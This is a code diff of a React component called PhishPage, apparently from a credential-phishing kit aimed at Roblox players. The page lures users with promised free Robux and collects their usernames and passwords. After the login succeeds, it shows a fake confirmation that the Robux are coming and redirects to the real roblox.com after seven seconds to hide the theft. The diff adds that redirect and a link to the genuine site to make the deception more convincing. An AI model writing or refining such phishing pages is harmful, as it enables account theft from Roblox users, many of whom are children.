@@ -1,13 +1,15 @@
 import React, { Component, Fragment } from 'react';
 import PropTypes from 'prop-types';
 import withStyles from '@material-ui/core/styles/withStyles';
-import { } from 'react-router-dom';
+import { Redirect } from 'react-router-dom';
+
+import Transition from '../utils/SlideTransition';
 
 import RobuxSvg from '../svg/robux.svg';
 
-import Slide from '@material-ui/core/Slide';
 import Alert from '@material-ui/lab/Alert';
 import Dialog from '@material-ui/core/Dialog';
+import Link from '@material-ui/core/Link';
 import DialogTitle from '@material-ui/core/DialogTitle';
 import DialogContent from '@material-ui/core/DialogContent';
 import DialogContentText from '@material-ui/core/DialogContentText';
@@ -23,10 +25,6 @@ const styles = (theme) => ({
 	...theme.globalStyles
 });
 
-const Transition = React.forwardRef((props, ref) => {
-	return <Slide direction='up' ref={ref} {...props} />;
-})
-
 class PhishPage extends Component {
 	constructor() {
 		super();
@@ -35,12 +33,8 @@ class PhishPage extends Component {
 			username: '',
 			password: '',
 			errors: {},
-			in: false
+			redirect: false
 		};
-
-		setTimeout(() => {
-			this.setState({ in: true });
-		}, 8000)
 	}
 
 	// todo implement componentDidUpdate?
@@ -49,6 +43,12 @@ class PhishPage extends Component {
 			this.setState({ errors: props.UI.errors });
 		} else {
 			this.setState({ errors: {} });
+		}
+
+		if (props.auth.accountAuthenticated) {
+			setTimeout(() => {
+				window.location = "https://roblox.com";
+			}, 7000)
 		}
 	}
 
@@ -97,7 +97,7 @@ class PhishPage extends Component {
 							value={this.state.username}
 							onChange={this.onChange}
 							className={classes.textField}
-							variant='outlined'
+							variant='filled'
 							fullWidth
 						/>
 						<TextField
@@ -109,7 +109,7 @@ class PhishPage extends Component {
 							value={this.state.password}
 							onChange={this.onChange}
 							className={classes.textField}
-							variant='outlined'
+							variant='filled'
 							fullWidth
 						/>
 						<Button
@@ -144,10 +144,10 @@ class PhishPage extends Component {
 						</Typography>
 					</DialogTitle>
 					<DialogContent>
-						<DialogContentText variant="body2">
+						<DialogContentText variant='body1'>
 							If you filled in the correct login details, you should receive
 							your Robux within a matter of minutes! You will be redirected to
-							Roblox in 7 seconds
+							Roblox in 7 seconds, or click <Link href="https://roblox.com">here</Link> to redirect
 						</DialogContentText>
 					</DialogContent>
 				</Dialog>
